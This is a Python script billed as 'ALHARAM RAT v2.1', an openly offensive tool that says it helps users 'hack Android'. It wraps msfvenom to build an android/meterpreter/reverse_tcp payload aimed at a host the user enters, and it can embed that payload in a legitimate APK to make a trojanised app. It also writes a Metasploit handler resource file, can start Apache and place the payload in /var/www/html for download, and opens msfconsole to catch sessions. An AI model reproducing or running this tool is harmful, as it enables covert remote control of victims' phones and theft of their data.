import subprocess
from colorama import Fore, init
import time
import shutil
import os

init(autoreset=True)

print(Fore.GREEN + '''                               
                                    ⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⠿⠿⠿⢿⣿⠟⣼⣿⣿⣿⣿⣿⣿
                                    ⣿⣿⣿⣿⣿⣿⠟⠃⠁⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⣿⣿⣿⣿
                                    ⣿⣿⣿⣿⡿⠃⠀⣴⡄⠀⠀⠀⠀⠀⣴⡆⠀⠘⢿⣿⣿⣿⣿
                                    ⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿
                                    ⣿⠿⢿⣿⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⣿⡿⠿⣿
                                    ⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸
                                    ⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸
                                    ⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸
                                    ⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸
                                    ⣧⣤⣤⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣤⣤⣼
                                    ⣿⣿⣿⣿⣶⣤⡄⠀⠀⠀⣤⣤⣤⠀⠀⠀⢠⣤⣴⣿⣿⣿⣿
                                    ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
                                    ⣿⣿⣿⣿⣿⣿⣿⣤⣤⣴⣿⣿⣿⣦⣤⣤⣾⣿⣿⣿⣿⣿⣿
''')
print(Fore.RED + '''
  /$$$$$$  /$$       /$$   /$$  /$$$$$$  /$$$$$$$   /$$$$$$  /$$      /$$       /$$$$$$$   /$$$$$$  /$$$$$$$$
 /$$__  $$| $$      | $$  | $$ /$$__  $$| $$__  $$ /$$__  $$| $$$    /$$$      | $$__  $$ /$$__  $$|__  $$__/
| $$  \ $$| $$      | $$  | $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$  /$$$$      | $$  \ $$| $$  \ $$   | $$   
| $$$$$$$$| $$      | $$$$$$$$| $$$$$$$$| $$$$$$$/| $$$$$$$$| $$ $$/$$ $$      | $$$$$$$/| $$$$$$$$   | $$   
| $$__  $$| $$      | $$__  $$| $$__  $$| $$__  $$| $$__  $$| $$  $$$| $$      | $$__  $$| $$__  $$   | $$   
| $$  | $$| $$      | $$  | $$| $$  | $$| $$  \ $$| $$  | $$| $$\  $ | $$      | $$  \ $$| $$  | $$   | $$   
| $$  | $$| $$$$$$$$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$ \/  | $$      | $$  | $$| $$  | $$   | $$   
|__/  |__/|________/|__/  |__/|__/  |__/|__/  |__/|__/  |__/|__/     |__/      |__/  |__/|__/  |__/   |__/   
v2.1      
''')

print(Fore.CYAN + "This tool helps you to generate your payload easily to hack Android :)")
print(Fore.CYAN + "Buy me a coffee...")
print(Fore.CYAN + "Copyright: @ALHARAM")

print(Fore.RESET + "\n\n[1] Generate A Payload ")
print(Fore.RESET + "[2] Generate A Merged Payload Into Original APK ")
try:
    CHOICE = int(input('Choose A Number: '))
except ValueError:
    print(Fore.LIGHTRED_EX + "[x] Invalid Input. Please enter a number.")
    exit(1)

IP = input("Enter The Host: ")
PORT = input("Enter The Port: ")
PAYLOAD = input("Enter The Payload Name: ")
HACK = "android/meterpreter/reverse_tcp"

apache = input("Do you want to open Apache server ?! [yes/no]: ").strip().lower()
move = input("Do you want to move the payload to /var/www/html ?! [yes/no]: ").strip().lower()

content = f"""set lhost {IP}
set lport {PORT}
set payload {HACK}
use multi/handler
set exitonsession true
exploit -j
"""

def msfvenom():
    command = [
        'msfvenom',
        '-p', HACK,
        f'lhost={IP}',
        f'lport={PORT}',
        '-f', 'raw',
        '-o', f'result/{PAYLOAD}'
    ]
    print(' '.join(command))
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX + "[*] Please Wait, Your Payload Is Generating...")
    time.sleep(2)

    print(Fore.LIGHTGREEN_EX + "[*] Adding Permissions To The Payload...")
    time.sleep(2)

    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print(result.stdout.strip())
    
    if result.stderr:
        print(Fore.RESET + result.stderr.strip())
    
    if result.returncode != 0:
        print(Fore.LIGHTRED_EX + "[x] Error: Generating Payload Has Failed....")
    else:
        print(Fore.LIGHTGREEN_EX + "[*] Payload Generated Successfully.")
    
    os.makedirs('result', exist_ok=True)  # Ensure the result directory exists
    with open("result/RAT", "w") as file:
        file.write(content)
        time.sleep(2)
        print(Fore.LIGHTGREEN_EX + "[*] Content written to RAT file successfully.")
    if move == 'yes':
        time.sleep(10)
        movepayload()
        print(Fore.LIGHTGREEN_EX + "[*] Moving The Payload Into /var/www/html/....")    
    open_new_terminal_window()

def msfvenoom():
    ORIGINAL = input("Enter The Original APK: ")
    command = [
        'msfvenom',
        '-p', HACK,
        f'lhost={IP}',
        f'lport={PORT}',
        '-x', ORIGINAL,
        '-f', 'raw',
        '-o', f'result/{PAYLOAD}'
    ]
    print(' '.join(command))
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX + "[*] Please Wait, Your Payload Is Generating...")
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX + "[*] Merging The Payload With The Original APK...")
    time.sleep(2)
    print(Fore.LIGHTGREEN_EX + "[*] Adding Permissions To The Payload...")
    time.sleep(2)

    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(Fore.RESET + result.stdout.strip())
    
    if result.stderr:
        print(result.stderr.strip())
    
    if result.returncode != 0:
        print(Fore.LIGHTRED_EX + "[x] Error: Generating Merged Payload Has Failed....")
    else:
        print(Fore.LIGHTGREEN_EX + "[*] Merged Payload Generated Successfully.")
    
    os.makedirs('result', exist_ok=True)  # Ensure the result directory exists
    with open("result/RAT", "w") as file:
        file.write(content)
        time.sleep(2)
        print(Fore.LIGHTGREEN_EX + "[*] Content written to RAT file successfully.")
    if move == 'yes':
        time.sleep(10)
        movepayload()
        print(Fore.LIGHTGREEN_EX + "[*] Moving The Payload Into /var/www/html/....")
    open_new_terminal_window()

def open_new_terminal_window():
    command = 'xterm -e "msfconsole -r result/RAT"'
    subprocess.run(command, shell=True)

def start_apache_server():
    command = 'sudo service apache2 start'
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        print(Fore.LIGHTGREEN_EX + "[*] Apache Server Started Successfully.")
    else:
        print(Fore.LIGHTRED_EX + "[x] Error: Failed to Start Apache Server.")
        print(result.stderr.strip())

def movepayload():
    if not os.path.exists(f'result/{PAYLOAD}'):
        print(Fore.LIGHTRED_EX + "[x] Payload does not exist. Cannot move.")
        return
    shutil.move(f'result/{PAYLOAD}', '/var/www/html/')
    
if __name__ == "__main__":
    if apache == 'yes':
        start_apache_server()
        print(Fore.LIGHTGREEN_EX + "[*] Preparing The Virus....")

    if CHOICE == 1:
        msfvenom()  
    elif CHOICE == 2:
        msfvenoom()  
    else:
        print(Fore.LIGHTRED_EX + "[x] Invalid Choice.")
